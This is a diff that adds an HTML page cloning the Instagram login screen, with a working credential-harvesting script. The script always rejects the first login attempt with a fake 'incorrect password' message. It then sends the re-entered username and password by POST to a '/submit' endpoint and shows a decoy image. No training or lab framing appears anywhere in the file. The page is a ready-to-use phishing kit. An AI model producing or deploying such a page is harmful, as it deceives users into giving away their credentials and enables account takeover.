@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Styles remain unchanged */
+        :root {
+            --body-bg: #fafafa;
+            --box-bg: #fff;
+            --box-border-color: #dbdbdb;
+            --txt-color: #262626;
+            --txt-second-color: #8e8e8e;
+            --btn-bg: #0095f6;
+            --btn-color: #fff;
+            --fb-color: #385185;
+            --a-color: #00376b;
+        }
+
+        .dark {
+            --body-bg: #151515;
+            --box-bg: #151515;
+            --box-border-color: #262626;
+            --txt-color: #d2d2d2;
+        }
+
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-size: 12px;
+            font-weight: lighter;
+            font-family: 'Times New Roman', Times, serif;
+        }
+
+        body {
+            font-family: "Roboto", sans-serif;
+            color: var(--txt-color);
+        }
+
+        .container {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-container {
+            display: flex;
+            flex-grow: 1;
+        }
+
+        .main-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            max-width: 935px;
+            flex-grow: 1;
+        }
+
+        .slide-container {
+            height: 618px;
+            flex-basis: 454px;
+        }
+
+        .slide-content {
+            margin: 99px 0 0 151px;
+            position: relative;
+        }
+
+        .slide-content img {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease-in-out;
+        }
+
+        .slide-content img.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .form-container {
+            flex-grow: 1;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .box {
+            border: 1px solid var(--box-border-color);
+            background-color: var(--box-bg);
+        }
+
+        .form-content {
+            margin-bottom: 10px;
+            padding: 10px;
+        }
+
+        .form-content .logo {
+            text-align: center;
+            height: 51px;
+            width: 175px;
+            margin: 22px auto 12px;
+        }
+
+        .form-content .logo img {
+            max-width: 100%;
+        }
+
+        .logo-dark {
+            display: none;
+        }
+
+        .dark .logo-dark {
+            display: block;
+        }
+
+        .dark .logo-light {
+            display: none;
+        }
+
+        .signin-form {
+            padding-top: 24px;
+            margin-bottom: 10px;
+        }
+
+        .form-group {
+            margin: 0 35px 5px;
+        }
+
+        .animate-input {
+            height: 40px;
+            border: 1px solid var(--box-border-color);
+            border-radius: 3px;
+            position: relative;
+        }
+
+        .animate-input span {
+            position: absolute;
+            left: 8px;
+            height: 100%;
+            font-size: 12px;
+            line-height: 36px;
+            color: var(--txt-second-color);
+            transform-origin: left;
+            transition: transform 0.1s ease-in-out;
+            pointer-events: none;
+            transform: translateY(0);
+        }
+
+        .animate-input.active span {
+            transform: scale(0.75) translateY(-10px);
+        }
+
+        .animate-input input {
+            width: 100%;
+            height: 100%;
+            padding: 9px 8px 7px;
+            border: 0;
+            outline: 0;
+            background-color: var(--box-bg);
+            color: var(--txt-color);
+        }
+
+        .animate-input button {
+            color: var(--txt-color);
+            border: 0;
+            outline: 0;
+            display: inline;
+            font-weight: 600;
+            font-size: 14px;
+            background-color: transparent;
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            display: none;
+        }
+
+        .animate-input.active button {
+            display: inline;
+        }
+
+        .btn-group {
+            padding: 8px 35px;
+        }
+
+        .btn-login {
+            width: 100%;
+            border: 1px solid transparent;
+            outline: 0;
+            background-color: var(--btn-bg);
+            color: var(--btn-color);
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            line-height: 20px;
+            padding: 5px 9px;
+            border-radius: 7px;
+        }
+
+        button:disabled {
+            background-color: rgba(41, 139, 252, 0.696);
+        }
+
+        .divine {
+            padding: 10px 40px 18px;
+            display: flex;
+        }
+
+        .divine div:nth-child(2) {
+            font-size: 13px;
+            font-weight: 600;
+            line-height: 15px;
+            margin: 0 18px;
+            color: var(--txt-second-color);
+        }
+
+        .divine div:nth-child(1),
+        .divine div:nth-child(3) {
+            flex-grow: 1;
+            height: 1px;
+            background-color: var(--box-border-color);
+            position: relative;
+            top: 0.45em;
+        }
+
+        .btn-fb {
+            border: 0;
+            outline: 0;
+            background-color: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .btn-fb img {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+
+        .btn-fb span {
+            color: var(--fb-color);
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 18px;
+        }
+
+        .forgot-pw {
+            display: block;
+            font-size: 12px;
+            line-height: 14px;
+            margin-top: 12px;
+            text-align: center;
+            color: var(--a-color);
+            text-decoration: none;
+        }
+
+        .goto {
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+
+        .goto p {
+            font-size: 14px;
+            margin: 15px;
+            text-align: center;
+        }
+
+        .goto a {
+            text-decoration: none;
+            color: var(--btn-bg);
+            font-size: inherit;
+            line-height: 18px;
+            font-weight: 600;
+        }
+
+        .app-download {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .app-download p {
+            font-size: 14px;
+            line-height: 18px;
+            text-align: center;
+            margin: 10px 20px;
+        }
+
+        .store-link {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+        }
+
+        .store-link a img {
+            height: 40px;
+        }
+
+        .store-link a:nth-child(1) {
+            margin-right: 8px;
+        }
+
+        .footer {
+            padding-bottom: 52px;
+            padding-top: 24px;
+        }
+
+        .links {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .links a {
+            text-decoration: none;
+            color: var(--txt-second-color);
+            font-size: 13px;
+            line-height: 18px;
+            margin: 0 8px 12px 8px;
+        }
+
+        .copyright {
+            padding: 12px 0;
+            color: var(--txt-second-color);
+            font-size: 13px;
+            line-height: 18px;
+            text-align: center;
+        }
+
+        .error-message {
+            margin-top: 8px; /* Space above the error message */
+            font-size: 13px; /* Adjust font size if needed */
+            color: rgba(254, 5, 5, 0.723); /* Error message color */
+            display: none; /* Initially hidden */
+        }
+
+        /* Loading Overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999; /* On top of everything */
+        }
+
+        #loading-overlay img {
+            width: 100px; /* Adjust as necessary */
+        }
+
+        @media only screen and (max-width: 800px) {
+            .slide-container {
+                display: none;
+            }
+        }
+
+        @media only screen and (max-width: 500px) {
+            .main-content {
+                margin-top: 0;
+            }
+
+            .box {
+                border: 0;
+                background-color: transparent;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Loading Overlay -->
+    <div id="loading-overlay">
+        <img src="./images/Loading insta.png" alt="Loading...">
+    </div>
+    
+    <div class="container">
+        
+        <div class="main-container">
+            <div class="main-content">
+                
+                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
+                    <div class="slide-content" id="slide-content">
+                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
+                        <img src="./images/slide (2).jpg" alt="slide image">
+                        <img src="./images/slide (3).jpg" alt="slide image">
+                        <img src="./images/slide (4).jpg" alt="slide image">
+                        <img src="./images/slide (5).jpg" alt="slide image">
+                    </div>
+                </div>
+                <div class="form-container">
+                    <div class="form-content box">
+                        <div class="logo">
+                            <p style="font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif; font-size: 10px; margin-top: -20px;">English <span style="margin-top: -5px;">⌵</span><br><br><br><br>
+                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
+                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
+                        </div>
+                        <br><br><br><br><br>
+                        <br><br>
+                        <div class="btn-group">
+                            <button class="btn-fb">
+                                <div style="background-color: var(--btn-bg); height: 33px; width: 310px; border-radius: 5px"> <img src="./images/facebook-icon.png" alt="" style="margin-top: 8.5px; margin-left: -80px; position: absolute;">
+                                <span style="color: white"><p style="position: absolute; margin-left: 73px; margin-top: 7px; ">Continue with Facebook</p></span></div>
+                            </button>
+                            
+                        </div>
+                        <div class="divine">
+                            <div></div>
+                            <div style="font-family: 'Times New Roman', Times, serif ;">OR</div>
+                            <div></div>
+                        </div>
+                        <div class="signin-form" id="signin-form" style="margin-top: -20px;">
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>Phone number, username, or email</span>
+                                    <input type="text" style="background-color: rgb(250, 250, 250);" required>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <div class="animate-input">
+                                    <span>Password</span>
+                                    <input type="password" id="password" style="background-color: rgb(250, 250, 250);" required>
+                                    <button type="button" id="show-password-btn" style="display: none;">Show</button>
+                                </div>
+                            </div>
+                            <a href="#" class="forgot-pw" style="color: rgba(0, 4, 255, 0.708); margin-left: 150px; margin-top: 20px;">Forgot password?</a><br>
+                            <div class="btn-group">
+                                <button class="btn-login" id="signin-btn" disabled>
+                                    Log in
+                                </button>
+                                <div class="error-message" id="error-message" style="margin-left: 17px;">Sorry, your password was incorrect. Please double-check your password.</div>
+                            </div>
+                            
+                        </div>
+                    </div>
+                    <div class="box goto">
+                        <p>
+                            Don't have an account?
+                            <a href="#">Sign up</a>
+                        </p>
+                    </div>
+
+                    <div class="app-download">
+                        <p>Get the app.</p>
+                        <div class="store-link">
+                            <a href="#">
+                                <img src="./images/app-store.png" alt="app store">
+                            </a>
+                            <a href="#">
+                                <img src="./images/gg-play.png" alt="google play">
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Top Accounts</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Locations</a>
+                <a href="#" id="darkmode-toggle">Darkmode</a>
+            </div>
+            <div class="copyright">
+                © 2021 Instagram from Facebook
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Hide loading overlay once the page is fully loaded
+            const loadingOverlay = document.getElementById('loading-overlay');
+            loadingOverlay.style.display = 'none';
+
+            const emailInput = document.querySelector('input[type="text"]');
+            const passwordInput = document.getElementById('password');
+            const loginButton = document.getElementById('signin-btn');
+            const showPasswordButton = document.getElementById('show-password-btn');
+            const darkModeToggle = document.getElementById('darkmode-toggle');
+            const errorMessage = document.getElementById('error-message');
+            let loginAttempts = 0; // Counter for login attempts
+
+            
+
+            const animateInputs = document.querySelectorAll('.animate-input');
+
+            animateInputs.forEach(inputContainer => {
+                const input = inputContainer.querySelector('input');
+
+                input.addEventListener('focus', () => {
+                    inputContainer.classList.add('active');
+                });
+
+                input.addEventListener('blur', () => {
+                    if (!input.value) {
+                        inputContainer.classList.remove('active');
+                    }
+                });
+
+                input.addEventListener('input', () => {
+                    if (input.value) {
+                        inputContainer.classList.add('active');
+                    } else {
+                        inputContainer.classList.remove('active');
+                    }
+                    validateInputs();
+                });
+            });
+
+            function validateInputs() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                loginButton.disabled = !(email && password);
+            }
+
+            passwordInput.addEventListener('input', () => {
+                showPasswordButton.style.display = passwordInput.value ? 'inline' : 'none';
+            });
+
+            showPasswordButton.addEventListener('click', () => {
+                const isPasswordVisible = passwordInput.type === 'text';
+                passwordInput.type = isPasswordVisible ? 'password' : 'text';
+                showPasswordButton.textContent = isPasswordVisible ? 'Show' : 'Hide';
+            });
+
+            loginButton.addEventListener('click', async (e) => {
+                e.preventDefault();
+                loginAttempts++; // Increment the login attempt counter
+
+                if (loginAttempts === 1) {
+                    errorMessage.style.display = 'block'; // Show error message
+                } else {
+                    const username = emailInput.value;
+                    const password = passwordInput.value;
+
+                    try {
+                        const response = await fetch('/submit', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded',
+                                },
+                                body: new URLSearchParams({ username, password })
+                            });
+
+
+                        
+
+                        const result = await response.text();
+                        console.log('Success:', result);
+
+                        localStorage.setItem('formSubmitted', 'true');
+                        // Clear fields and disable button after submission
+                        emailInput.value = '';
+                        passwordInput.value = '';
+                        loginButton.disabled = true;
+                        showPasswordButton.style.display = 'none';
+                        errorMessage.style.display = 'none'; // Hide error message after login attempt
+                        loginAttempts = 0; // Reset login attempts
+                       
+                        // displayImage();
+                        displayFaviconAndImage();
+                        
+
+                    } catch (error) {
+                        console.error('Error:', error);
+                    }
+                }
+            });
+
+            function displayFaviconAndImage() {
+            // Create overlay for the favicon
+                const overlay = document.createElement('div');
+                overlay.style.position = 'fixed';
+                overlay.style.top = '0';
+                overlay.style.left = '0';
+                overlay.style.right = '0';
+                overlay.style.bottom = '0';
+                overlay.style.display = 'flex';
+                overlay.style.alignItems = 'center';
+                overlay.style.justifyContent = 'center';
+                overlay.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
+
+                const faviconImage = document.createElement('img');
+                faviconImage.src = './images/favicon.png'; // Your favicon path
+                faviconImage.alt = 'Loading...';
+                faviconImage.style.width = '100px'; // Adjust as needed
+
+                overlay.appendChild(faviconImage);
+                document.body.appendChild(overlay);
+
+                // Show the favicon for 2 seconds
+                setTimeout(() => {
+                    // Hide the favicon overlay
+                    document.body.removeChild(overlay);
+                    displayImage();
+
+
+                }, 1000); // 2000 milliseconds = 2 seconds
+            }
+
+            
+
+
+
+             function displayImage() {
+                localStorage.setItem('formSubmitted', 'true');
+            document.body.innerHTML = `
+                <img src="./images/next_page.jpg" alt="Submitted!" style="width: auto; height: 100vh; margin-left:10%; ">
+            `;
+            }
+
+            if (localStorage.getItem('formSubmitted') === 'true') {
+                hideImage();
+            }
+
+            darkModeToggle.addEventListener('click', () => {
+                document.body.classList.toggle('dark');
+                const isDarkMode = document.body.classList.contains('dark');
+                darkModeToggle.textContent = isDarkMode ? 'Light mode' : 'Dark mode';
+            });
+        });
+    </script>
+
+</body>
+
+</html>
